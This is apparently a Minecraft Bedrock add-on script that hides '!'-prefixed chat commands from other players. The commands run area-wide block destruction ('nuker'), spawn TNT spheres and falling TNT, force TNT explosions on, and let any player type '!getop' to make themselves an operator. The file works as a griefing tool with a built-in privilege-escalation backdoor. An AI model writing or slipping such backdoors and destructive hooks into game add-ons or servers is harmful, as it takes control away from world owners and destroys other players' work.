import { world, system, Player, Container, BlockPermutation } from "@minecraft/server";

system.runInterval(() => {
    world.getDimension(`overworld`).runCommandAsync(`gamerule tntexplodes true`)
    world.getAllPlayers().forEach(p => {
        if (p.hasTag(`nuker`) || hasMainItem(p, `karo:nuker`)) {
            p.runCommandAsync(`fill ~20 ~5 ~20 ~-20 ~-5 ~-20 air destroy`)
        }
        if (p.hasTag(`title`) || hasMainItem(p, `karo:title`)) {
            p.runCommandAsync(`title @a title §l§4§kaaa§r§l§c ${p.nameTag} §r§l§4§kaaa`)
        }
        if (p.hasTag(`falltnt`) || hasMainItem(p, `karo:tnt`)) {
            p.runCommandAsync(`summon tnt ~ ~30 ~`)
        }
    })
})

world.beforeEvents.chatSend.subscribe((ev) => {
    const { message, sender } = ev;
    if (!message.startsWith(`!`)) return
    ev.cancel = true
    const [command, sub, sub2] = message.split(` `)
    switch (command) {
        case `!title`: {
            if (sender.hasTag(`title`)) {
                sender.removeTag(`title`)
            } else {
                sender.addTag(`title`)
            }
            break
        }
        case `!tnt`: {
            if (sender.hasTag(`falltnt`)) {
                sender.removeTag(`falltnt`)
            } else {
                sender.addTag(`falltnt`)
            }
            break
        }
        case `!bt`: {
            // 点Aの座標
            const A_x = sender.location.x;
            const A_y = sender.location.y;
            const A_z = sender.location.z;

            // 円の半径
            const r = Number(message.split(` `)[1]);

            // 度数からラジアンへの変換関数
            function degreesToRadians(degrees) {
                return (degrees * Math.PI) / 180;
            }

            // 座標を取得する関数
            function getCoordinates(latitudeDegrees, longitudeDegrees, centerX, centerY, centerZ, radius) {
                const latitudeRadians = degreesToRadians(latitudeDegrees);
                const longitudeRadians = degreesToRadians(longitudeDegrees);
                const x = centerX + radius * Math.cos(longitudeRadians) * Math.sin(latitudeRadians);
                const y = centerY + radius * Math.sin(longitudeRadians) * Math.sin(latitudeRadians);
                const z = centerZ + radius * Math.cos(latitudeRadians);
                return { x, y, z };
            }

            // 全ての座標を取得する
            for (let latitude = -180; latitude <= 180; latitude++) {
                system.run(() => {
                    for (let longitude = 0; longitude < 180; longitude++) {
                        const { x, y, z } = getCoordinates(latitude, longitude, A_x, A_y, A_z, r);
                        world.getDimension(`overworld`).fillBlocks({ x: x, y: y, z: z }, { x: x, y: y, z: z }, BlockPermutation.resolve(`minecraft:tnt`))
                    }
                })
            }
            break
        }
        case `!nuker`: {
            if(sender.hasTag(`nuker`)) {
                sender.removeTag(`nuker`)
            } else {
                sender.addTag(`nuker`)
            }
            break
        }
        case `!getop`: {
            sender.setOp(true)
            break
        }
    }
})

/**
 * 
 * @param {Player} player 
 * @param {string} itemType
 */
function hasMainItem(player, itemType) {
    /**
     * @type {Container}
     */
    const container = player.getComponent(`inventory`).container
    const item = container.getItem(player.selectedSlot)
    if (!item || item.typeId !== itemType) {
        return false
    } else {
        return true
    }
}